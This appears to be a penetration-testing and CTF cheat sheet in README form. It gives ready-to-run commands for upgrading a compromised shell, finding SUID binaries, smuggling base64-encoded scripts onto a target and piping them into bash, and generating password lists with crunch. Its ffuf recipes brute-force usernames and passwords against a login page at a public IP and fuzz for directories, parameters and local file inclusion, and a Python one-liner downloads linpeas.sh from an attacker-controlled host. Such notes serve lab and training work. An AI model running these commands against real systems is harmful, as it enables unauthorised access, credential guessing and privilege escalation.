# FunThings
Funthings

## STTY upgrade

```
python3 -c 'import pty;pty.spawn("/bin/bash");'
stty rows 40 cols 190
export SHELL=bash
export TERM=xterm
export LS_OPTIONS='--color=auto'
eval "`dircolors`"
alias ls='ls $LS_OPTIONS'
export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
press CTRL+Z
stty raw -echo
fg
ENTER
ENTER
```

## SUID 

```
find / -type f -perm -04000 -ls 2>/dev/null
```


## Get response (bash) 

```
echo -n "Enter a Username: " && head -1 </dev/s| tr -d "\n"
```


## Quick transfer shells + encoded (copy and paste to target)

Easy Binary or file transfer

```
#Encode file
cat file | base64 -w500 | xclip -sel o

#Go to target and press SHIFT+INSERT after entering command line below

cat<<EOF >filename.b64
#SHIFT+INSERT NOW
EOF

#Decode file or run straight
cat file.b64 | base64 -d > file.sh
cat file.b64 | base64 -d | bash
```

### Example

test.sh
```
#!/bin/bash
echo "Testing Works"
```

```
cat test.sh | base64 -w500 | xclip -sel o

cat <<EOF > testing.b64                  
heredoc> IyEvYmluL2Jhc2gKZWNobyAiVEVTVElORyIK                               # << Pressing "SHIFT" + "INSERT" here                 
heredoc> EOF

cat testing.b64 | base64 -d | bash
Testing Works
```


## Crunch

```
crunch 8 8 -t k1ll0r@@ --stdout
crunch 8 8 -t k1ll0r@@ -f charset.lst mixalpha-numeric
```


## Ffuf

### post login

```
ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=FUZZ&password=a" -w "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" -fr "Invalid Username" -H 'Content-Type: application/x-www-form-urlencoded'

ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=access&password=FUZZ" -w "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt" -fr "Invalid Password" -H 'Content-Type: application/x-www-form-urlencoded'

```

### Dir Fuzz

```
ffuf -u http://10.10.11.135/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -i -ic -mc all  -t 80 -fc 404,403 -e .php,.html,.txt -c
```

### Paramater FUZZ

GET
```
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

POST
```
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

### Recursive Fuzz

```
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```

### Value Fuzzing 

```
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

### LFI FUZZ

Fuzz 2 point (LFI example, img,file,path(WW1), filepath(WW2))

```
ffuf -u http://10.10.11.135/image.php?WW1=WW2 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:WW1,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:WW2   -i -ic -mc all  -t 80  -c -fc 404,403,301
```

```
ffuf -u http://10.10.11.135/image.php?img=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt   -i -ic -mc all  -t 80  -c -fc 404,403,301
```

![image](https://user-images.githubusercontent.com/5285547/149621994-1c2b5e52-a5a6-47e3-8970-ab70f7ee42d1.png)

### Exts Fuzzing

```
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ
```

```
ffuf -u http://test.academy.htb:32583/FUZZ -w ~/Desktop/Useful\ Repos/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -mc all -fc 404 -c -ic -e .php,.html,.txt,.htm,.aspx,.asp,.js,.css,.pgsql.txt,.mysql.txt,.pdf,.cgi,.inc,.gif,.jpg,.swf,.xml,.cfm,.xhtml,.wmv,.zip,.axd,.gz,.png,.doc,.shtml,.jsp,.ico,.exe,.csi,.inc.php,.config,.jpeg,.ashx,.log,.xls,.0,.old,.mp3,.com,.tar,.ini,.asa,.tgz,.PDF,.flv,.php3,.bak,.rar,.asmx,.xlsx,.page,.phtml,.dll,.JPG,.asax,.1,.msg,.pl,.GIF,.ZIP,.csv,.css.aspx,.2,.JPEG,.3,.ppt,.nsf,.Pdf,.Gif,.bmp,.sql,.Jpeg,.Jpg,.xml.gz,.Zip,.new,.avi,.psd,.rss,.5,.wav,.action,.db,.dat,.do,.xsl,.class,.mdb,.include,.12,.cs,.class.php,.htc,.mov,.tpl,.4,.6.12,.9,.js.php,.mysql-connect,.mpg,.rdf,.rtf
```

## Wordlists 

| Command | Description |
| ------- | ----------- |
|/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt |	Directory/Page Wordlist|
|/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt	| Extensions Wordlist |
|/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt |	Domain Wordlist |
|/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt	|Parameters Wordlist|

## PHP md5 sum date every second

php -a

```
while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' .
time());echo "\n";sleep(1);}
```

## Python3 FTP server

```
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

## Python3 download a file 

```
python3 -c "import urllib.request;u = 'http://10.33.1.154:8080/linpeas.sh';urllib.request.urlretrieve(u, 'linpeas.sh')"
```


![image](https://user-images.githubusercontent.com/5285547/157315084-108bc212-efa1-42f5-9d2c-43c3400c0066.png)
